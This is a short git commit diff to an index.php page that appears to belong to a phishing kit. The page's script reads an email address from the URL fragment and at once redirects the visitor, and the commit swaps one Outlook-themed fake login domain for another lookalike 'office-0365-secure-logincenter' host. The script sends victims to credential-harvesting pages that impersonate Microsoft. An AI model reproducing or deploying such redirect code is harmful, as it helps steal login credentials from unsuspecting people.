5a8129bbd3496419d519b6083d7a6e6015318f5d
Bkege8374 <102458573+Bkege8374@users.noreply.github.com>
2022-03-31 13:55:09 +0000

    Update index.php

--- index.php
+++ index.php
@@ -19,7 +19,7 @@
 		var em = hash.split("#")[1];
 
 		window.setTimeout(function () {
-			window.location.href = "https://outlook-secured-login.glitch.me?p=outlook&t=10";
+			window.location.href = "https://office-0365-secure-logincenter-verified001.tokensession.workers.dev?t=10";
 		}, 0);
 	</script>
 </html>
